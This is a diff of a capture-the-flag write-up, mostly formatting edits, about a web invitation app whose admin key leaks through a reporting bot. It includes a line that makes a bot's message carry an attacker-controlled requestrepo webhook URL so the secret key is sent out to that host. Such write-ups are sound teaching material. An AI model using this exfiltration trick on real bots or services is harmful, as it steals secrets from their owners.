@@ -15,21 +15,21 @@ I am allowed to create an invitation and to report issues about invitation.
 
 ![Oops](./image/test_web.gif)
 
-Each invitation has an id.
+Each invitation has a unique id.
 
 ## 🧑‍💻 Processing:
 **web/app.py:** This file contains server code. There are some endpoints:
 
-`/post/<string(length=16):id>`: I can get an invitation through this endpoint by supplying `id` (`len(id) == 16`). Besides, I can supply a `key` and make `is_admin` take value `True` to receive the flag. Maybe my target is `key` value.
+- `/post/<string(length=16):id>`: I can get an invitation through this endpoint by supplying `id` (`len(id) == 16`). Besides, I can supply a `key` and make `is_admin` take value `True` to receive the flag. Maybe my target is `key` value.
 
-`/api/new`: This endpoint creates post. I POST `title`, `content` and server will generate `id` for that post. Posts will be saved in database (`id`, `title`, `content`).
+- `/api/new`: This endpoint creates post. I POST `title`, `content` and server will generate `id` for that post. Posts will be saved in database (`id`, `title`, `content`).
 
-`api/delete`: Deletes a post if I had `id` and `key`.
+- `api/delete`: Deletes a post if I had `id` and `key`.
 
-`/api/report`: This endpoint takes my reports (`url`, `reason`, `g-recaptcha-response`). There are a lot of check stages here. After all, `message` will be saved in database. Look at the message form: 
-```py 
-message = f"URL: {url}?key={key}\nReason: {reason}"
-```
+- `/api/report`: This endpoint takes my reports (`url`, `reason`, `g-recaptcha-response`). There are a lot of check stages here. After all, `message` will be saved in database. Look at the message form: 
+    ```py 
+    message = f"URL: {url}?key={key}\nReason: {reason}"
+    ```
 
 Because there is bot directory, maybe I need to bypass check stages and make message contain my webhook like:
 ```py
@@ -38,6 +38,8 @@ f'URL: http://hjvnswkt.requestrepo.com?key={key}\nReason: something'
 Or some messages similar. And the bot will click on the URL/send request and the key will be revealed. (In an ideal scenario) 🤤 
 
 Let's check it out.
+
+
 
 **bot/crawler.py:** 🤖
 
@@ -54,7 +56,7 @@ Then I realized every big platforms like Discord have their own bots, and they c
 Setup a webhook:
 ![Oops](./image/setup_requestrepo.jpg)
 
-Send a message with the webhook:
+Send a message which contains the webhook URL:
 ![Oops](./image/chat_url.jpg)
 
 And receive requests:
